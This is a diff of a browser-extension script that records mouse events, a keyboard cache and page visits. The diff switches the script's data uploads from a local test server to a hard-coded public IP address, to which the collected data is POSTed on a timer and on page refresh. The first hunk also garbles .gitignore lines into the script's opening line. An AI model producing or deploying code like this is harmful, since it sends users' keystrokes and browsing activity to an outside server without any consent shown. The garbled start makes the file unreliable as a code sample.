@@ -1,12 +1,4 @@
-*.ipynb_checkpoints
-*.ipynb
-*.crx
-*.pem
-venv/
-*.txt
-.DS_store
-*/_pycache__/
-personal_constants.pyvar SEND_INTERVAL = 3000; // interval 
+var SEND_INTERVAL = 3000; // interval 
 var CAPTURE_INTERVAL = 20;  // interval of capturing a mouse event
 var MAX_SAVED = 10;
 var CHUNK_TYPE_MOUSE = 0
@@ -104,10 +96,10 @@ function runExtension() {
 		},
 		add:function(income) {
 			if (this.saved.length == MAX_SAVED){
-				fetch("http://127.0.0.1:5000/api/get_content", {
+				fetch("http://95.163.180.52/api/get_content", {
 				  method: "POST", 
 				  headers: {
-				    'Access-Control-Allow-Origin': 'http://127.0.0.1:5000/'
+				    'Access-Control-Allow-Origin': 'http://95.163.180.52/'
 				  },
 				  body: JSON.stringify(this.saved)
 				}).then(res => {
@@ -136,7 +128,7 @@ function runExtension() {
 			this.saved.push(income)
 		}
 	}
-	var refreshIntervalId = setInterval(function() {fetch("http://127.0.0.1:5000/api/get_content", {
+	var refreshIntervalId = setInterval(function() {fetch("http://95.163.180.52/api/get_content", {
 											method: "POST", 
 											body: JSON.stringify(keyBoardCache.saved)
 												}).then(res => {
@@ -156,7 +148,7 @@ function runExtension() {
 	}
 
 	function onRefresh(time_ml) {
-		fetch("http://127.0.0.1:5000/api/get_content", {
+		fetch("http://95.163.180.52/api/get_content", {
 											method: "POST", 
 											body: JSON.stringify(pageVisit(time_ml))
 												}).then(res => {
